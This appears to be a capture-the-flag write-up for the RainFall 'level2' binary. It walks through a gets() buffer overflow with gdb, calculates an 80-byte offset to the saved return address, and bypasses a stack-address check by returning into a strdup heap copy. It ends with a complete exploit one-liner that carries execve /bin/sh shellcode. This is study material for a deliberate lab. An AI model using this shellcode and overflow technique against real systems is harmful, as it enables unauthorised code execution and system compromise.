# level02

The program waits for an input:

```bash
level2@RainFall:~$ ./level2 
sd
sd
```

By looking at the code, we can see that the a `gets` is made on a 76 bytes buffer. Also, a check is performed on the `eip` address to see if it begins with `0xb`.

We can calculate the buffer length to override `eip`:

```bash
(gdb) r <<< $(python -c "print 'A' * 80")
Starting program: /home/user/level2/level2 <<< $(python -c "print 'A' * 80")

Breakpoint 1, 0x080484f2 in p ()
(gdb) x/29wx $esp
0xbffff680:     0xbffff69c      0x00000000      0x00000000      0xb7e5ec73
0xbffff690:     0x080482b5      0x00000000      0x00c30000      0x41414141
0xbffff6a0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff6b0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff6c0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff6d0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff6e0:     0x41414141      0x41414141      0x41414141      0x08048500
0xbffff6f0:     0x08048550
(gdb) i f
Stack level 0, frame at 0xbffff6f0:
 eip = 0x80484f2 in p; saved eip 0x8048500
 called by frame at 0x41414149
 Arglist at 0xbffff6e8, args: 
 Locals at 0xbffff6e8, Previous frame's sp is 0xbffff6f0
 Saved registers:
  ebp at 0xbffff6e8, eip at 0xbffff6ec
(gdb) p/d 0xbffff6ec - (0xbffff690 + 8)
$3 = 84
(gdb) p/d 0xbffff6ec - (0xbffff690 + 12)
$8 = 80
```

We need 80 bytes before overriding `eip`. Unless overriding `eip` with a stack address, we will take an address on the heap, the address from `strdup`:

```assembly
Breakpoint 2, 0x0804853d in p ()
(gdb) x/x $eax
0x804a008:      0x41414141
```

We can now put our shellcode as argument, and put the heap address after the 80 padding bytes:

```bash
`(python -c "print  '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + 'A' * (80 - 21) + '\x08\xa0\x04\x08'";cat) | ./level2`
```
